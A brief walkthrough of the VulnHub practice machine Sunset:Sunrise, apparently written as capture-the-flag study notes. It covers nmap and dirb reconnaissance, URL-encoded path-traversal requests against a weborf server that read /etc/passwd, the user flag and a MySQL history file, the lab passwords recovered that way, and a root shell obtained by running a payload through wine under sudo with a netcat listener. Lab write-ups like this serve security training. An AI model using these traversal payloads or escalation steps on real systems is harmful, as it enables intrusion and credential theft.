

# Sunset:Sunrise Walkthrough 

**VulnHub Link:** [Sunset:Sunrise](https://www.vulnhub.com/entry/sunset-sunrise,406/)
**Difficulty:** Easy
**Release Date:** 6 Dec 2019

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.131
```


## 2.Web Enumeration

```bash
dirb http://ip
```

in 192.168.100.84:8080 , weborf version vulnerability found


/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd in url

http://192.168.100.84:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2fuser.txt --> gives user flag

http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.mysql_history --> mysql password found and used in ssh service --- iheartrainbows44

in ssh, mysql -u weborf -p , mysql gain access

in mysql, sunrise password found --> thefutureissobrightigottawearshades

## 3.Privilege Escalation

in sunrise, sudo -u root /usr/bin/wine payload.exe connection gained from netcat --> root flag
